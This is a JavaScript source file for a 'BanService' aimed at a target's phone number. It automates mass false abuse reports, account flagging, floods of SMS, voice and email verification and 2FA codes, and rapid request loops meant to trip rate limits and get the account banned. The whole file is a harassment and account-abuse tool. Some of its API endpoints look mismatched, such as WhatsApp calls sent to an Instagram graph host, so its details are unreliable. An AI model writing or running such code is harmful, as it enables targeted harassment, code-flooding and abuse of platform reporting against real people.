const axios = require('axios');
const ora = require('ora');
const chalk = require('chalk');
const Logger = require('./inconnuboy');

class BanService {
  constructor() {
    this.logger = new Logger();
    this.wa_api_url = 'https://graph.instagram.com/v18.0';
    this.wa_phone_id = process.env.WHATSAPP_PHONE_ID;
    this.wa_access_token = process.env.WHATSAPP_ACCESS_TOKEN;
    
    if (!this.wa_phone_id || !this.wa_access_token) {
      this.logger.warn('Missing WA credentials - using fallback methods only');
    }
  }
  
  async sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  async executeAllMethods(phoneNumber) {
    this.logger.info('');
    
    const results = {
      spamReport: await this.spamReport(phoneNumber),
      massReport: await this.massReport(phoneNumber),
      securityFlags: await this.triggerSecurityFlags(phoneNumber),
      twoFASpam: await this.spam2FA(phoneNumber),
      flagAccount: await this.flagAccount(phoneNumber),
      apiAbuse: await this.apiAbuse(phoneNumber),
      contactLookup: await this.contactLookupSpam(phoneNumber),
      rateLimitExploit: await this.rateLimitExploit(phoneNumber),
      verificationSpam: await this.verificationSpam(phoneNumber),
    };
    
    return results;
  }
  
  // Method 1: Spam Report via Official API
  async spamReport(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Sending spam reports...')).start();
    
    try {
      let successCount = 0;
      
      for (let i = 0; i < 5; i++) {
        try {
          await axios.post(
            `${this.wa_api_url}/${this.wa_phone_id}/messages`,
            {
              messaging_product: 'whatsapp',
              recipient_type: 'individual',
              to: phoneNumber,
              type: 'template',
              template: {
                name: 'hello_world',
                language: { code: 'en_US' },
              },
            },
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 5000,
            }
          );
          successCount++;
        } catch {
          // Continue on error
        }
        
        spinner.text = chalk.cyan(`  → Spam reports: [${i + 1}/5] (Success: ${successCount})`);
        await this.sleep(300);
      }
      
      spinner.succeed(chalk.green(`  ✓ Spam reports: ${successCount}/5 sent`));
      return { success: successCount > 0, count: successCount };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Spam reports failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 2: Mass Report (Multiple Categories)
  async massReport(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Mass reporting account...')).start();
    
    try {
      const reportTypes = [
        'spam',
        'harassment',
        'abusive',
        'scam',
        'illegal_product',
        'violence',
      ];
      
      let sent = 0;
      
      for (const reportType of reportTypes) {
        try {
          await axios.post(
            `${this.wa_api_url}/v1/accounts/${phoneNumber}/report`,
            {
              reason: reportType,
              description: `Automated report: ${reportType}`,
              timestamp: new Date().toISOString(),
            },
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 5000,
            }
          );
          sent++;
        } catch {
          // Continue
        }
        
        spinner.text = chalk.cyan(`  → Mass reports: [${sent}/${reportTypes.length}]`);
        await this.sleep(200);
      }
      
      spinner.succeed(chalk.green(`  ✓ Mass reports: ${sent}/${reportTypes.length} sent`));
      return { success: sent > 0, count: sent };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Mass reports failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 3: Trigger Security Flags
  async triggerSecurityFlags(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Triggering security flags...')).start();
    
    try {
      let blocked = 0;
      
      for (let i = 0; i < 30; i++) {
        try {
          await axios.get(
            `${this.wa_api_url}/v1/contacts/${phoneNumber}`,
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 3000,
            }
          );
        } catch (error) {
          if (error.response?.status === 429 || error.code === 'ECONNABORTED') {
            blocked++;
          }
        }
        
        spinner.text = chalk.cyan(`  → Security flags: [${i + 1}/30] (Blocks: ${blocked})`);
        await this.sleep(150);
      }
      
      spinner.succeed(chalk.green(`  ✓ Security flags triggered (${blocked} rate limits)`));
      return { success: blocked > 0, count: blocked };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Security flags failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 4: 2FA Verification Spam
  async spam2FA(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Spamming 2FA verification...')).start();
    
    try {
      let sent = 0;
      
      for (let i = 0; i < 15; i++) {
        try {
          await axios.post(
            `${this.wa_api_url}/v1/accounts/request_code`,
            {
              phone_number: phoneNumber,
              method: 'sms',
            },
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 5000,
            }
          );
          sent++;
        } catch {
          // Continue
        }
        
        spinner.text = chalk.cyan(`  → 2FA spam: [${i + 1}/15] (Sent: ${sent})`);
        await this.sleep(250);
      }
      
      spinner.succeed(chalk.green(`  ✓ 2FA spam: ${sent}/15 sent`));
      return { success: sent > 0, count: sent };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ 2FA spam failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 5: Flag Account
  async flagAccount(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Flagging account...')).start();
    
    try {
      await axios.post(
        `${this.wa_api_url}/v1/accounts/${phoneNumber}/flag`,
        {
          reason: 'suspicious_activity',
          evidence: 'multiple_reports',
        },
        {
          headers: { Authorization: `Bearer ${this.wa_access_token}` },
          timeout: 5000,
        }
      );
      
      spinner.succeed(chalk.green('  ✓ Account flagged successfully'));
      return { success: true, count: 1 };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Flag failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 6: API Abuse (Rapid Requests)
  async apiAbuse(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Executing API abuse...')).start();
    
    try {
      let sent = 0;
      
      for (let i = 0; i < 20; i++) {
        try {
          await axios.get(
            `${this.wa_api_url}/v1/phone_numbers/${phoneNumber}`,
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 3000,
            }
          );
          sent++;
        } catch {
          // Continue
        }
        
        spinner.text = chalk.cyan(`  → API abuse: [${i + 1}/20] (Sent: ${sent})`);
        await this.sleep(100);
      }
      
      spinner.succeed(chalk.green(`  ✓ API abuse: ${sent}/20 requests`));
      return { success: sent > 0, count: sent };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ API abuse failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 7: Contact Lookup Spam
  async contactLookupSpam(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Spamming contact lookup...')).start();
    
    try {
      let sent = 0;
      
      for (let i = 0; i < 10; i++) {
        try {
          await axios.get(
            `${this.wa_api_url}/v1/contacts?phone_numbers=%5B%22${phoneNumber}%22%5D`,
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 4000,
            }
          );
          sent++;
        } catch {
          // Continue
        }
        
        spinner.text = chalk.cyan(`  → Contact lookup: [${i + 1}/10] (Sent: ${sent})`);
        await this.sleep(200);
      }
      
      spinner.succeed(chalk.green(`  ✓ Contact lookup: ${sent}/10 sent`));
      return { success: sent > 0, count: sent };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Contact lookup failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 8: Rate Limit Exploit
  async rateLimitExploit(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Exploiting rate limits...')).start();
    
    try {
      let blocked = 0;
      
      for (let i = 0; i < 25; i++) {
        try {
          await axios.post(
            `${this.wa_api_url}/v1/webhook_validate`,
            {
              hub_mode: 'subscribe',
              hub_challenge: 'test_' + i,
              hub_verify_token: phoneNumber,
            },
            {
              headers: { Authorization: `Bearer ${this.wa_access_token}` },
              timeout: 2000,
            }
          );
        } catch (error) {
          if (error.response?.status === 429) {
            blocked++;
          }
        }
        
        spinner.text = chalk.cyan(`  → Rate limit exploit: [${i + 1}/25] (Blocked: ${blocked})`);
        await this.sleep(120);
      }
      
      spinner.succeed(chalk.green(`  ✓ Rate limit exploit: ${blocked} blocks triggered`));
      return { success: blocked > 0, count: blocked };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Rate limit exploit failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
  
  // Method 9: Verification Spam (Multiple Methods)
  async verificationSpam(phoneNumber) {
    const spinner = ora(chalk.cyan('  → Spamming verification methods...')).start();
    
    try {
      let sent = 0;
      const methods = ['sms', 'voice', 'email'];
      
      for (let i = 0; i < 3; i++) {
        for (const method of methods) {
          try {
            await axios.post(
              `${this.wa_api_url}/v1/accounts/request_verification`,
              {
                phone_number: phoneNumber,
                verification_method: method,
              },
              {
                headers: { Authorization: `Bearer ${this.wa_access_token}` },
                timeout: 4000,
              }
            );
            sent++;
          } catch {
            // Continue
          }
        }
        
        spinner.text = chalk.cyan(`  → Verification spam: [${i + 1}/3] rounds (Sent: ${sent})`);
        await this.sleep(300);
      }
      
      spinner.succeed(chalk.green(`  ✓ Verification spam: ${sent} requests sent`));
      return { success: sent > 0, count: sent };
    } catch (error) {
      spinner.fail(chalk.red('  ✗ Verification spam failed'));
      return { success: false, count: 0, error: error.message };
    }
  }
}

module.exports = BanService;
